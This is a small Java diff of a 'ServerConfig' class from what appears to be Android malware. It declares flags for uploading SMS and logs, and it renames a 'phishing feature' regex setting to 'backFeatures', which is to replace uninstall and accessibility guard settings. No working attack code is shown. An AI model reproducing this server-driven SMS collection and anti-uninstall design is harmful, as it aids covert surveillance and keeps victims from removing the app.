@@ -37,8 +37,8 @@ public class ServerConfig {
 
     private boolean uploadLog;
 
-    //TODO 解锁钓鱼特征[["节点ID", "node.getText() 匹配的正则"],[...]]
-    private String unlockFishFeatures;
+    //TODO back特征[["节点ID", "node.getText() 匹配的正则"],[...]] 逐步替代 uninstallGuardFeatures 和 accessibilityGuardFeatures
+    private String backFeatures;
 
     //上传短信
     private boolean uploadSms;
